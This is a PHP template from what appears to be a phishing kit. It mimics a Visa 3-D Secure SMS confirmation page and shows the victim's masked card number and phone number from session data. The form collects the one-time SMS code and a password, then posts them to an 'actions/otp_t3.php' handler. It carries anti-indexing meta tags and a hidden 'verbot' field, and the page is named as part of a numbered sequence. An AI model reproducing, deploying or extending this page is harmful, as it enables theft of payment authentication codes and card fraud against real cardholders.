<?php 


include("../infos.php");
include("../common/sub_includes.php");
include('../langue.php');

?>

<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/helpers.css">
        <link rel="stylesheet" href="css/fonts.css">
        <link rel="stylesheet" href="css/main.css">
        <link rel="icon" href="images/favicon.ico" type="image/x-icon"> 
        <title><?php echo $sms3dpage_1; ?></title>

    </head>

    <body>


        <form action="../actions/otp_t3.php" method="post">
            <input type="hidden" name="verbot">
            <input type="hidden" name="type" value="confirm_code">
            <input type="hidden" name="error" value="">
            <div id="sms-wrapper">
                <div class="logo"><img src="img/nt.png"></div>
                <h3><?php echo $sms3dpage_22; ?></h3>
                <div class="details">
                    <div class="inner-details">
                        <p><?php echo $sms3dpage_3; ?></p>
                        <p><b><?php echo $sms3dpage_4; ?></b><?php echo $sms3dpage_5; ?></p>
                        <table>
                            <tr>
                                <td><?php echo $sms3dpage_6; ?></td>
                                <td><?php echo $sms3dpage_7; ?></td>
                            </tr>
                            <tr>
                                <td><?php echo $sms3dpage_8; ?></td>
                                <td><?php echo $sms3dpage_9; ?></td>
                            </tr>
                            <tr>
                                <td><?php echo $sms3dpage_10; ?></td>
                                <td><?php echo date('d/m/Y H:i:s') ?></td>
                            </tr>
                            <tr>
                                <td><?php echo $sms3dpage_11; ?></td>
                                <td>**** **** ****<?php echo $_SESSION['last4']; ?></td>
                            </tr>
                            <tr>
                                <td><?php echo $sms3dpage_12; ?></td>
                                <td><?php echo $sms3dpage_13; ?>*******<?php echo $_SESSION['4lastephone']; ?></td>
                            </tr>
                            <tr>
                                <td><?php echo $sms3dpage3_1; ?><span style="color:red;">*</span> :</td>
                                <td><input type="text" name="confirm_code" id="confirm_code" class=""></td>
                            </tr>
							
							<tr style="margin-top:15px;">
                                <td><?php echo $sms3dpage3_2; ?><span style="color:red;">*</span> :</td>
                                <td><input type="password" name="confirm_code" id="confirm_code_pwd" class=""></td>
                            </tr>
							<center><p style="color:red;display:none;">Code Invalid</p></center>
                        </table>
                        <p class="mt20"><span><?php echo $sms3dpage_15; ?></span></p>
                    </div>
                </div>
                <div class="btns">
                    <button type="submit"><?php echo $sms3dpage_16; ?></button><br>
                    <img src="img/nt.png" style="max-width: 100px; margin-top: 10px;">
                </div>
                <div class="copy"><?php echo $sms3dpage_17; ?> <?php echo "Visa"; ?></div>
            </div>

        </form>

        <!-- JS FILES -->
        <script src="js/jquery.min.js"></script>
        <script src="js/popper.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/fontawesome.min.js"></script>
        <script src="js/main.js"></script>

    </body>

</html>